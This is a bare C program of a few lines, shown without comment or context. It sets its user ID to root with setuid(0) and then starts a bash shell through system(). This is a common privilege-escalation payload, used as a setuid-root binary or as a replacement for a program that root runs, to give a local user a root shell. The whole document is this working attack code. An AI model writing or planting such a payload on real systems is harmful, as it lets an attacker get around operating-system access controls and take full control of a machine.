#include<stdio.h>
int main()
{
setuid(0);
return system("bash");
}
